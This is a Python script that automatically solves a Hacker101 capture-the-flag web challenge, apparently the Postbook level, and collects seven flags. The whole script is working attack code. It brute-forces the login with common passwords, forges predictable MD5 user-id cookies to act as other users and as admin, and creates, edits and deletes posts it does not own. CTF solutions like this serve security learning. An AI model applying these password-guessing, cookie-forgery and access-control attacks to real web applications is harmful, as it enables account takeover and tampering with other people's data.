# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag
# Getting CTF URL #
ctf_url = f"https://{input("[1] Enter your ctf id: ")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        print("\033[32m[2] Please wait featching first flags.\033[0m")
        # Getting first flag by bruteforcing authentication page #
        for password in ["123456", "12345", "123456789", "password", "iloveyou", "princess", "1234567", "rockyou", "12345678"]:
            response_flag_1_html_content = post_request(f"{ctf_url}/index.php?page=sign_in.php", data = {'username': 'user', 'password': password}).text
            # If flag found append flag and break loop #
            if "You've entered a wrong username/password combination." not in response_flag_1_html_content:
                FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", response_flag_1_html_content).group(1)}$FLAG$')
                break
        print("\033[32m[3] Please wait featching second flags.\033[0m")
        # Checking for flags after loggingIn, in unauthorized page #
        for i in range(10):
            response_flag_2_html_content = get_request(f"{ctf_url}/index.php?page=view.php&id=2", cookies = {'id': 'c81e728d9d4c2f636f067f89cc14862c'}).text
            # If flag found append flag and break loop #
            if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", response_flag_2_html_content):
                FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", response_flag_2_html_content).group(1)}$FLAG$')
                break
        print("\033[32m[4] Please wait featching third flags.\033[0m")
        # Making a post by admin user without loggin in and authenctication #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", post_request(f"{ctf_url}/index.php?page=create.php", data = {'body': 'This is private post', 'return': 'home', 'user_id': '3'}, cookies = {'id': 'c81e728d9d4c2f636f067f89cc14862c'}).text).group(1)}$FLAG$')
        print("\033[32m[5] Please wait featching fourth flags.\033[0m")
        # Getting flag from post id 945 which is 189 * 5 #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/index.php?page=view.php&id=945", cookies = {'id': 'c81e728d9d4c2f636f067f89cc14862c'}).text).group(1)}$FLAG$')
        print("\033[32m[6] Please wait featching fifth flags.\033[0m")
        # Editing a post which is not of the current user #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", post_request(f"{ctf_url}/index.php?page=edit.php&id=1", data = {'title': 'Homepage', 'body': 'This is private post'}, cookies = {'id': 'c81e728d9d4c2f636f067f89cc14862c'}).text).group(1)}$FLAG$')
        print("\033[32m[7] Please wait featching sixth flags.\033[0m")
        # Logging in as admin user #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}/index.php', cookies = {'id': 'c4ca4238a0b923820dcc509a6f75849b'}).text).group(1)}$FLAG$')
        print("\033[32m[8] Please wait featching seventh flags.\033[0m")
        # Deleting a post which is not owner by user #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}/index.php?page=delete.php&id=c4ca4238a0b923820dcc509a6f75849b', cookies = {'id': 'c81e728d9d4c2f636f067f89cc14862c'}).text).group(1)}$FLAG$')
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m{str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[9] Your flags are: {FLAGS}\033[0m")